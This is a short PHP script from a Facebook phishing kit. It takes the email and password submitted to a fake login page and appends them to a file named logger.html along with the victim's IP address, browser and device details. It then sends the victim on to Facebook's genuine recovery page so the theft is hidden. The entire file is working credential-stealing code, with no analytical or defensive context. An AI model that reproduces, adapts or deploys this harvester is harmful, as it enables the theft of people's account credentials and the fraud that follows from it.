<?php
$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 

$brows = $_SERVER['HTTP_ACCEPT'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$os = $_SERVER['HTTP_OPERATING_SYSTEM'];
$osVersion = $_SERVER['HTTP_OS_VERSION'];
$DeviceType = $_SERVER['HTTP_DEVICE_TYPE'];
$DeviceBrand = $_SERVER['HTTP_DEVICE_BRAND'];
$DeviceModel = $_SERVER['HTTP_DEVICE_MODEL'];

$f = fopen("logger.html", "a"); 

fwrite ($f, 'FACEBOOK LOGIN: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>]   Brows: [<b><font color="#008080">'.$brows.'</font></b>]   USER_AGENT: [<b><font color="#008080">'.$userAgent.'</font></b>]  OS: [<b><font color="#008080">'.$os.'</font></b>]  OS_VERSION: [<b><font color="#008080">'.$osVersion.'</font></b>]  Device_Type: [<b><font color="#008080">'.$DeviceType.'</font></b>]  Device_Brand: [<b><font color="#008080">'.$DeviceBrand.'</font></b>]  Device_Model: [<b><font color="#008080">'.$DeviceModel.'</font></b>] <br><br>');


fclose($f);
header('Location: https://facebook.com/recover/initiate/');
?>
